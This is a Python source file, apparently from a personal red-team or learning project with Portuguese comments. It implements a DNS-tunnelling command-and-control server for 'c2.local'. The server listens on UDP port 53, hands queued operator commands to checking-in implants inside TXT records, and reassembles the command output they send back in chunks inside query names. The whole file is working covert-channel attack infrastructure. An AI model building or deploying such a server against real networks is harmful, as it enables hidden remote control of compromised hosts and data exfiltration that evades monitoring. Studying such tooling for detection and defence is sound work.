import socket
import dns.message as dm
import dns.rrset  # Importante para criar o registro TXT
from common.protocolo import DNSprotocolo
import sys
import queue
import threading
from servidor.painel import Painel

class DNSlistener:
    def __init__(self, ip='127.0.0.1', port=53):
        self.ip = ip
        self.port = port
        self.filaComandos = queue.Queue()
        self.buffer = {}

    def start(self):
        try:
            painel = Painel(self.filaComandos)

            threaPainel = threading.Thread(target=painel.start, daemon=True)

            threaPainel.start()

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as self.s:
                self.s.bind((self.ip, self.port))
                print(f'[*] escutando na porta {self.port} \n')

                self.s.settimeout(5)

                while True:
                    try:
                        if not threaPainel.is_alive():
                            print('[*] Painel encerrado, desligando servidor...')
                            break

                        pacote, endereco = self.s.recvfrom(1024)
                        self.handlePacket(pacote, endereco, self.s)

                    except socket.timeout:
                        continue

                    except (KeyboardInterrupt, SystemExit):
                        print('[*] Encerrando servidor...')

        except (KeyboardInterrupt, SystemExit):
            print('\n[*] Desligando...')

        except Exception as e:
            print(f"[-] Erro inesperado: {e}")

        # BLOCO START: Inicia o painel em segundo plano (Thread) e abre a porta 53 UDP em um loop eterno.

    def handlePacket(self, dadosBrutos, endereco, socket_rede):
        try:
            pacote = dm.from_wire(dadosBrutos)
            urlBruta = pacote.question[0].name.to_text()
            tipo, mensagem , numPacote, totalPacotes = DNSprotocolo.limparUrl(urlBruta, 'c2.local')

            if tipo == '1':
                self.responde(pacote, socket_rede, endereco, self.verificarFila())
                self.buffer.clear()

            else:
                self.buffer[numPacote] = mensagem

                if len(self.buffer) >= totalPacotes:
                    print(DNSprotocolo.traduzir(DNSprotocolo.juntaString(self.buffer, totalPacotes)).decode('utf-8'))

                self.responde(pacote, socket_rede, endereco)
            
        except Exception as e:
            print(f"[-] Erro ao processar: {e}")

        # BLOCO HANDLEPACKET: Guarda de trânsito. Se tipo 1 (Ping), pega ordem da fila e envia. Se tipo 2 (Dados), decodifica e exibe o output na tela.

    def responde(self, pacote, socket_rede, endereco, comando_b32=None):
        resposta = dm.make_response(pacote)
        
        if comando_b32:
            rrset = dns.rrset.from_text(pacote.question[0].name, 300, 'IN', 'TXT', f'"{comando_b32}"')
            resposta.answer.append(rrset)
            #print(f"[+] Resposta enviada com o comando: {comando_b32}")

        dadosResposta = resposta.to_wire()
        socket_rede.sendto(dadosResposta, endereco)

        # BLOCO RESPONDE: Construtor de rede. Cria a resposta DNS espelhando a pergunta e injeta o comando em formato TXT se ele existir.

    def verificarFila(self):
        if not self.filaComandos.empty():
            comando = self.filaComandos.get_nowait()

            return comando

        else:
            return None
        
        # BLOCO VERIFICARFILA: Espia a esteira do painel. Se tiver comando digitado, retira da fila e retorna; se não, retorna None.

if __name__ == '__main__':
    listener = DNSlistener()
    listener.start()
